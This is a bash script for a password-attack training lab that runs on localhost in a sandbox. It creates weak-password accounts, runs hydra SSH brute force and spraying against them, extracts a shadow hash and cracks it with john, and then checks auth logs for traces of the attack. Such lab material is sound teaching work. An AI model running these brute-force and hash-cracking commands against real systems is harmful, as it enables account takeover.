#!/usr/bin/env bash
# Lab 13 — Password Attacks: Spraying & Brute Force
# Auto-assembled from the lab README's command blocks. Review before running.
# Run on the Killercoda Ubuntu Playground: https://killercoda.com/playgrounds/scenario/ubuntu
set -uo pipefail
export DEBIAN_FRONTEND=noninteractive

echo '=== block 1 ==='
apt-get update -qq && apt-get install -y hydra john openssh-server
service ssh start || systemctl start ssh

echo '=== block 2 ==='
useradd -m victim 2>/dev/null; echo 'victim:password123' | chpasswd
for u in alice bob carol; do useradd -m "$u" 2>/dev/null; echo "$u:S0mePass!" | chpasswd; done
echo "accounts ready"

echo '=== block 3 ==='
printf 'letmein\nqwerty\npassword123\nadmin\n' > words.txt
cat words.txt

echo '=== block 4 ==='
hydra -l victim -P words.txt -t 4 -f ssh://127.0.0.1

echo '=== block 5 ==='
grep 'Failed password' /var/log/auth.log 2>/dev/null | tail -5 \
  || journalctl -u ssh --no-pager 2>/dev/null | grep -i 'failed' | tail -5

echo '=== block 6 ==='
getent shadow victim > hash.txt
john --wordlist=words.txt hash.txt
john --show hash.txt

echo '=== block 7 ==='
for u in alice bob carol victim; do
  hydra -l "$u" -p 'password123' -t 1 -f ssh://127.0.0.1 2>/dev/null | grep -i 'login:' || true
done

echo '=== block 8 ==='
grep 'Failed password' /var/log/auth.log 2>/dev/null \
  | grep -oE 'for [a-z]+ ' | sort | uniq -c | sort -nr | head \
  || echo "check journalctl -u ssh for the same pattern"

echo '=== block 9 ==='
john --show hash.txt | grep -q 'password123' && echo "OFFLINE CRACK OK"
( grep -q 'Failed password' /var/log/auth.log 2>/dev/null || journalctl -u ssh 2>/dev/null | grep -qi failed ) && echo "ATTACK LOGGED (indicator present)"
